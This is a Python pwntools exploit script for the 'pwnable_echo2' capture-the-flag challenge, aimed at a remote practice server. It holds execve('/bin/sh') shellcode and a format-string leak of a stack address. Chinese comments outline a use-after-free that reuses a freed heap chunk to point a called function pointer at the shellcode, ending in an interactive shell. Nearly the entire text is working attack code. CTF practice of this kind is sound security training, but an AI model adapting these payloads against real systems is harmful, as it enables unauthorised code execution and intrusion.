# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './pwnable_echo2'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc/libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27475'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda            : int( p.recv(14)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

one_gad = one_gadget(libc.path)
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
printf_got = elf.got["printf"]

#6
payload = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
sla(":", payload)
cmd(2)

#dbg("printf")

#此处格式化字符串仅仅可以泄露出libc
'''
1.第一次创建的堆块会写上各个函数地址，在之后会被调用
2.退出free掉该堆块
3.选择3，malloc重新利用该堆块，在o[4]处写上后门shellcode地址
4.之后会自动执行o[4]处的函数
'''

payload = "%10$p"
sla("hello",payload)
rl()
rbp_addr  = rint()
shell_addr = rbp_addr - 0x20
cmd(4)
sla("(y/n)","n")
cmd(3)

payload = "a"*0x18 + p64(shell_addr)
sla("hello",payload)


p.interactive()

'''
@File    :   pwnable_echo2.py
@Time    :   2021/07/30 20:44:33
@Author  :   Niyah 
'''
